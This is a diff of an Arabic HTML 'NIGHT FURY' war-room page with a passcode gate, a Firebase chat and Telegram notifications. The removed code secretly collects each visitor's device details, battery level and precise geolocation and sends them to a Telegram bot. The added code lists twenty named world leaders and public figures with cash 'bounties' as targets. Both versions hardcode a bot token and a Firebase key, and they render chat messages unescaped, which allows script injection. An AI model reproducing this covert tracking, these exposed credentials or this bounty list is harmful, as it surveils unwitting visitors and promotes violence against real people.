@@ -3,47 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NIGHT FURY | INTELLIGENCE HUB</title>
+    <title>NIGHT FURY | WAR ROOM v9</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Orbitron:wght@600&display=swap" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <style>
-        :root { --red-alert: #ff0000; --locked: #440000; }
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #fff; font-family: 'Cairo', sans-serif; overflow: hidden; user-select: none; }
+        :root { --red-alert: #ff0000; --gold: #ffd700; --panel-bg: #0d0d0d; }
+        body, html { margin: 0; padding: 0; background: #000; color: #fff; font-family: 'Cairo', sans-serif; overflow-x: hidden; user-select: none; }
+        
+        /* بوابة الدخول */
         #GATE { position: fixed; width: 100%; height: 100%; background: black; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
-        .auth-box { background: #0f0f0f; padding: 40px 20px; border: 2px solid var(--red-alert); text-align: center; width: 85%; max-width: 380px; border-radius: 10px; }
-        .unit-id { background: #000; border: 2px solid var(--red-alert); color: var(--red-alert); padding: 15px; width: 85%; text-align: center; font-family: 'Orbitron'; font-size: 28px; letter-spacing: 10px; margin-bottom: 25px; outline: none; border-radius: 8px; }
-        .btn-deploy { background: var(--red-alert); color: white; border: none; padding: 15px; font-weight: 900; cursor: pointer; border-radius: 5px; width: 85%; font-size: 16px; }
-        #OPERATIONS_HUB { display: none; padding: 10px; height: 100vh; background: #000; flex-direction: column; box-sizing: border-box; }
-        .chat-display { flex: 1; padding: 15px; overflow-y: auto; background: #050505; border: 1px solid #1a1a1a; margin: 10px 0; border-radius: 8px; margin-bottom: 110px; }
-        .chat-controls { position: fixed; bottom: 45px; left: 10px; right: 10px; background: #111; border: 2px solid var(--red-alert); padding: 10px; border-radius: 15px; display: flex; gap: 10px; align-items: center; }
-        .chat-input { flex: 1; background: #000; color: #fff; padding: 12px; border: 1px solid #333; outline: none; border-radius: 8px; }
-        .btn-send { background: var(--red-alert); border: none; width: 55px; height: 45px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .auth-box { background: #0f0f0f; padding: 40px 20px; border: 2px solid var(--red-alert); text-align: center; width: 85%; max-width: 380px; border-radius: 10px; box-shadow: 0 0 20px rgba(255,0,0,0.4); }
+        .unit-id { background: #000; border: 2px solid var(--red-alert); color: var(--red-alert); padding: 15px; width: 85%; text-align: center; font-family: 'Orbitron'; font-size: 28px; letter-spacing: 10px; margin-bottom: 25px; outline: none; }
+        .btn-deploy { background: var(--red-alert); color: white; border: none; padding: 15px; font-weight: 900; width: 85%; cursor: pointer; }
+
+        /* لوحة القيادة */
+        #WAR_ROOM { display: none; padding: 15px; min-height: 100vh; flex-direction: column; }
+        .header-war { border-bottom: 2px solid var(--red-alert); padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
+        .header-war h1 { font-family: 'Orbitron'; color: var(--red-alert); margin: 0; font-size: 22px; }
+
+        /* نظام المربعات */
+        .grid-container { display: grid; grid-template-columns: 1fr; gap: 15px; }
+        .card { background: var(--panel-bg); border: 1px solid #333; border-radius: 8px; padding: 15px; position: relative; overflow: hidden; }
+        .card::before { content: ""; position: absolute; top: 0; right: 0; width: 5px; height: 100%; background: var(--red-alert); }
+        .card h3 { color: var(--red-alert); font-size: 16px; margin-top: 0; border-bottom: 1px solid #222; padding-bottom: 5px; }
+
+        /* قسم الطائرات */
+        .fleet-info { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; border-bottom: 1px dashed #222; padding-bottom: 5px; }
+        .fleet-name { font-weight: 900; color: var(--gold); }
+
+        /* قسم الأهداف */
+        .target-list { font-size: 12px; }
+        .target-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1a1a1a; }
+        .bounty { color: #00ff00; font-family: 'Orbitron'; }
+
+        /* قسم الدردشة */
+        .chat-section { height: 300px; overflow-y: auto; background: #050505; border: 1px solid #222; padding: 10px; margin-top: 10px; border-radius: 5px; }
+        .chat-input-war { width: 100%; background: #000; border: 1px solid var(--red-alert); color: #fff; padding: 12px; margin-top: 10px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
     <div id="GATE">
-        <div style="color:red; font-family:Orbitron; border:2px solid red; padding:5px; margin-bottom:20px;">TOP SECRET</div>
         <div class="auth-box">
-            <h2 id="gate-title">نظام التوثيق الثنائي</h2>
-            <p id="gate-desc" style="font-size:11px; color:#666; margin-bottom:15px;">المستوى الأول: شفرة الدخول (1931)</p>
+            <h2 id="gate-title">LEVEL: COMMANDER</h2>
+            <p id="gate-desc" style="font-size:11px; color:#666;">أدخل شفرة المستوى الأول (1931)</p>
             <input type="password" id="unit_key" class="unit-id" placeholder="****" maxlength="4">
-            <button class="btn-deploy" id="deploy_btn" onclick="checkStep()">تحقق من الهوية</button>
+            <button class="btn-deploy" onclick="checkStep()">تأكيد التصريح</button>
         </div>
     </div>
 
-    <div id="OPERATIONS_HUB">
-        <div style="text-align:center; padding:10px; border-bottom:1px solid #333;">
-            <h1 style="color:red; font-size:16px;">مقر NIGHT FURY</h1>
+    <div id="WAR_ROOM">
+        <div class="header-war">
+            <h1>NIGHT FURY OPERATIONS</h1>
+            <div style="font-size: 10px; color: #444;">LAT: 32.78 // LON: 45.12 // WASIT BASE</div>
         </div>
-        <div class="chat-display" id="chat-box"></div>
-        <div class="chat-controls">
-            <input type="text" id="chat-input" class="chat-input" placeholder="رسالة مشفرة...">
-            <button class="btn-send" onclick="sendBroadcast()">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
-            </button>
+
+        <div class="grid-container">
+            <div class="card">
+                <h3>أسطول الطائرات الجاهزة</h3>
+                <div class="fleet-info">
+                    <span class="fleet-name">SU-57 (FELON)</span>
+                    <span>العدد: 200 | الجاهزة: 50</span>
+                </div>
+                <div class="fleet-info">
+                    <span class="fleet-name">F-22 RAPTOR</span>
+                    <span>العدد: 180 | الجاهزة: 120</span>
+                </div>
+                <div class="fleet-info">
+                    <span class="fleet-name">F-35 LIGHTNING II</span>
+                    <span>العدد: 350 | الجاهزة: 210</span>
+                </div>
+                <div class="fleet-info">
+                    <span class="fleet-name">EUROFIGHTER TYPHOON</span>
+                    <span>العدد: 100 | الجاهزة: 45</span>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>الأهداف المطلوبة (HVT)</h3>
+                <div class="target-list" id="targets-list">
+                    </div>
+            </div>
+
+            <div class="card">
+                <h3>مراسلة مشفرة</h3>
+                <div class="chat-section" id="chat-box"></div>
+                <input type="text" id="chat-input" class="chat-input-war" placeholder="أدخل رسالة مشفرة...">
+                <button onclick="sendBroadcast()" style="width:100%; background:red; border:none; padding:10px; margin-top:5px; color:white; font-weight:bold;">إرسال للرادار</button>
+            </div>
         </div>
     </div>
 
@@ -51,7 +100,7 @@
         const KEY_1 = "1931", KEY_2 = "1379";
         const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
         const TG_ID = "7772577035"; 
-        let step = 1, attempts = 0;
+        let step = 1;
 
         const firebaseConfig = {
           apiKey: "AIzaSyDEawwmho55-yPdFzre4aDleIMB7YMW-Ew",
@@ -65,79 +114,58 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        async function getIntel() {
-            let intel = `🧛‍♂️ **تقرير استخباراتي جديد**\n`;
-            
-            // نوع الجهاز والنظام
-            intel += `📱 النظام: ${navigator.platform}\n`;
-            intel += `🌐 المتصفح: ${navigator.userAgent.split(') ')[0].split(' (')[1]}\n`;
-            
-            // معلومات البطارية
-            try {
-                const battery = await navigator.getBattery();
-                intel += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
-                intel += `⚡ الحالة: ${battery.charging ? 'جاري الشحن' : 'على البطارية'}\n`;
-            } catch (e) { intel += `🔋 البطارية: غير مدعوم\n`; }
+        // قائمة الأهداف (20 هدف عالمي)
+        const targets = [
+            {n: "دونالد ترامب", b: "3M USD"}, {n: "جيفري ابستين", b: "1M USD"},
+            {n: "إيلون ماسك", b: "5M USD"}, {n: "فلاديمير بوتين", b: "10M USD"},
+            {n: "جو بايدن", b: "2M USD"}, {n: "بنيامين نتنياهو", b: "8M USD"},
+            {n: "مارك زوكربيرغ", b: "1.5M USD"}, {n: "جيف بيزوس", b: "1.2M USD"},
+            {n: "بوريس جونسون", b: "900K USD"}, {n: "إيمانويل ماكرون", b: "1.1M USD"},
+            {n: "كيم جونغ أون", b: "7M USD"}, {n: "بيل غيتس", b: "2.5M USD"},
+            {n: "ناريندرا مودي", b: "1M USD"}, {n: "ريشي سوناك", b: "800K USD"},
+            {n: "أولاف شولتس", b: "950K USD"}, {n: "شي جين بينغ", b: "9.5M USD"},
+            {n: "فولوديمير زيلينسكي", b: "4M USD"}, {n: "محمد بن سلمان", b: "6M USD"},
+            {n: "جاستن ترودو", b: "700K USD"}, {n: "أنتوني بلينكن", b: "500K USD"}
+        ];
 
-            // الموقع الدقيق
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    intel += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
-                    sendToTelegram(intel);
-                }, () => {
-                    intel += `📍 الموقع: المستخدم رفض الإذن\n`;
-                    sendToTelegram(intel);
-                });
-            } else {
-                intel += `📍 الموقع: غير مدعوم\n`;
-                sendToTelegram(intel);
-            }
-        }
-
-        function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
+        function loadTargets() {
+            const list = document.getElementById('targets-list');
+            targets.forEach(t => {
+                list.innerHTML += `<div class="target-item"><span>${t.n}</span><span class="bounty">${t.b}</span></div>`;
+            });
         }
 
         function checkStep() {
             const input = document.getElementById('unit_key');
-            if (step === 1) {
-                if (input.value === KEY_1) {
-                    step = 2; attempts = 0; input.value = "";
-                    document.getElementById('gate-title').innerText = "المستوى الثاني";
-                    document.getElementById('gate-desc').innerText = "أدخل الشفرة النهائية (1379)";
-                } else { handleFail(); }
-            } else if (step === 2) {
-                if (input.value === KEY_2) {
-                    document.getElementById('GATE').style.display = 'none';
-                    document.getElementById('OPERATIONS_HUB').style.display = 'flex';
-                    getIntel(); // سحب المعلومات فور الدخول
-                } else { handleFail(); }
-            }
+            if (step === 1 && input.value === KEY_1) {
+                step = 2; input.value = "";
+                document.getElementById('gate-title').innerText = "SECURITY STEP 2";
+                document.getElementById('gate-desc').innerText = "أدخل الشفرة النهائية (1379)";
+            } else if (step === 2 && input.value === KEY_2) {
+                document.getElementById('GATE').style.display = 'none';
+                document.getElementById('WAR_ROOM').style.display = 'flex';
+                loadTargets();
+                sendToTelegram("🚀 Commander entered the War Room");
+            } else { input.value = ""; alert("ACCESS DENIED"); }
         }
 
-        function handleFail() {
-            attempts++; input.value = "";
-            if (attempts >= 3) {
-                sendToTelegram("⚠️ محاولة اختراق فاشلة من جهاز: " + navigator.userAgent);
-                alert("تم حظر الجهاز!");
-            }
+        function sendToTelegram(txt) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(txt)}`);
         }
 
         function sendBroadcast() {
             const msg = document.getElementById('chat-input').value;
             if (!msg.trim()) return;
-            db.ref('night_fury_intel_ops').push().set({
-                user: "AGENT", message: msg, time: new Date().toLocaleTimeString('ar-EG')
+            db.ref('night_fury_war_v9').push().set({
+                user: "COMMANDER", message: msg, time: new Date().toLocaleTimeString('ar-EG')
             });
-            sendToTelegram(`🧛‍♂️ [رسالة]: ${msg}`);
+            sendToTelegram(`🧛‍♂️ [WAR MSG]: ${msg}`);
             document.getElementById('chat-input').value = "";
         }
 
-        db.ref('night_fury_intel_ops').limitToLast(20).on('child_added', (snap) => {
-            const data = snap.val();
-            document.getElementById('chat-box').innerHTML += `<div style="margin-bottom:10px; border-right:2px solid red; padding-right:5px;"><small style="color:red;">${data.user}</small><br>${data.message}</div>`;
+        db.ref('night_fury_war_v9').limitToLast(15).on('child_added', (snap) => {
+            const d = snap.val();
+            document.getElementById('chat-box').innerHTML += `<div style="border-bottom:1px solid #1a1a1a; padding:5px;"><small style="color:red;">${d.time}</small> - ${d.message}</div>`;
             document.getElementById('chat-box').scrollTop = document.getElementById('chat-box').scrollHeight;
         });
     </script>
